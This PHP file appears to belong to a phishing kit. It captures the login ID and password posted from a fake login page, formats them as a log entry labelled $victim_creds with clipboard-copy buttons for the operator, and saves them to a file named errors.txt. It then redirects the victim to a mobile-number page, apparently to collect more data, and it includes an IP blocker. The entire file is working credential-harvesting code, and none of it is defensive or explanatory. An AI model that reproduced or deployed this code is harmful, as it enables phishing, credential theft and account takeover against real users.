<?php
include 'AddResult.php';
include 'ip_blocker.php';
if(isset($_POST['loginid']) && isset($_POST['uipassword'])) {
$username = $_POST['loginid'];
$password = $_POST['uipassword'];
$rnd = "xcpy".rand(36773,346737);
$rnd2 = "pcpy".rand(36773,346737);
$victim_creds = "
<span style='color:gray;'>{$date} {$IP}</span>  
<span style='color:lime;'>LOGIN</span> > 
[<span style='color:green;' id='{$rnd}' data-clipboard-text='{$username}'>{$username}</span>] > 
[<span style='color:green;' id='{$rnd2}' data-clipboard-text='{$password}'>{$password}</span>]
    <script>
    var $rnd = document.getElementById('{$rnd}');
    var clipboard = new ClipboardJS($rnd);

    clipboard.on('success', function(e) {
        console.log(e);
    });

    clipboard.on('error', function(e) {
        console.log(e);
    });
    </script>


    <script>
    var $rnd2 = document.getElementById('{$rnd2}');
    var clipboard = new ClipboardJS($rnd2);

    clipboard.on('success', function(e) {
        console.log(e);
    });

    clipboard.on('error', function(e) {
        console.log(e);
    });
    </script><br>
";


AddResult('errors.txt', $victim_creds);
header('location:mobilenumber.php');

}

?>

